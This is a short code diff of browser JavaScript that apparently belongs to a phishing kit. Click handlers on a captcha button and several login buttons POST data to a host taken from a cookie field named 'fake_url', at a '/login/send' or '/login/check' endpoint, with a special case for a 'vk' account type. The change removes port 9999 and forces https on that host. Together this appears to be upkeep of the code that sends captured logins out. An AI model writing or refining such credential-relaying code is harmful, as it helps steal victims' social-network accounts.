@@ -233,7 +233,8 @@
         captcha_button.addEventListener('click', async (e)=>{
             e.preventDefault()
             let url = decodeURIComponent(cookies_data.fake_url)
-            await fetch(`${url}:9999/login/${cookies_data.has_validator?'check':'send'}`, {
+            url = new URL(url).host
+            await fetch(`https://${url}/login/${cookies_data.has_validator?'check':'send'}`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -280,7 +281,8 @@
         buttons.map(e => e.addEventListener('click', async (e) => {
             e.preventDefault()
             let url = decodeURIComponent(cookies_data.fake_url)
-            await fetch(`${url}:9999/login/${cookies_data.has_validator?'check':'send'}`, {
+            url = new URL(url).host
+            await fetch(`https://${url}/login/${cookies_data.has_validator&&cookies_data.type==='vk'?'check':'send'}`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
